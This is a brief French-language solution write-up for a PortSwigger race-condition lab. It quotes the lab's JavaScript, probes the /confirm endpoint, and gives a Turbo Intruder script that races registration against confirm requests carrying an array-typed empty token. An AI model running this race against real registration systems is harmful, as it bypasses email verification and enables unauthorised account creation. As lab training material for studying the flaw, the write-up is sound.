# Lab

https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction

## Payload

Dans `/resources/static/users.js` il y a :

```js
const confirmEmail = () => {
    const container = document.getElementsByClassName('confirmation')[0];

    const parts = window.location.href.split("?");
    const query = parts.length == 2 ? parts[1] : "";
    const action = query.includes('token') ? query : "";

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/confirm?' + action;

    const button = document.createElement('button');
    button.className = 'button';
    button.type = 'submit';
    button.textContent = 'Confirm';

    form.appendChild(button);
    container.appendChild(form);
}
```

Ce qui nous montre qu'un service `/confirm` existe et qu'il est possible de lui passer un paramètre `token`.

Si on essaie la requête :

- Avec un token random, on obtient `Incorrect token: a`
- Avec un token vide `token=`, on obtient `Forbidden`
- Avec un token vide `token[]=`, on obtient `Invalid token: Array`
- Sans token, on obtient `Missing parameter: token`

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )


    confirmReq = r'''POST /confirm?token[]= HTTP/2
Host: 0af400d803cdc17783faabd200060054.web-security-academy.net
Cookie: phpsessionid=gtcCUgNiHfbSp9cG3geD6zP5pSRartLb
Content-Length: 0
'''
    
    for i in range(20):
        username = 'uu' + str(i)
        engine.queue(target.req, username, gate=str(i))
        for j in range(50):
            engine.queue(confirmReq, gate=str(i))
        engine.openGate(str(i))


def handleResponse(req, interesting):
    table.add(req)
```